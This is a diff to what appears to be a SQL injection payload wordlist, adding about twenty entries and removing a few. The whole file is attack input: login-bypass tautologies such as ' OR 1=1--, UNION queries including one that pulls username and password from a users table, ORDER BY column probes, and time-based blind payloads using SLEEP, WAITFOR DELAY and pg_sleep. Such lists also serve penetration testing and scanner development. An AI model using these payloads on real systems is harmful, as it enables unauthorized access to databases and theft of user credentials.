@@ -1,5 +1,22 @@
 ' OR '1'='1
-' OR '1'='1' --
-admin'--
-1' AND '1'='2
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR 'a'='a
+' OR 1=1 LIMIT 1--
+' OR 1=1--
+" OR ""="
+" OR 1=1--
+') OR ('1'='1
+') OR 1=1--
+') OR ('a'='a
 ' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT username,password FROM users--
+' AND 1=1--
+' AND 1=2--
+' ORDER BY 1--
+' ORDER BY 10--
+' AND SLEEP(5)--
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+' OR pg_sleep(5)--
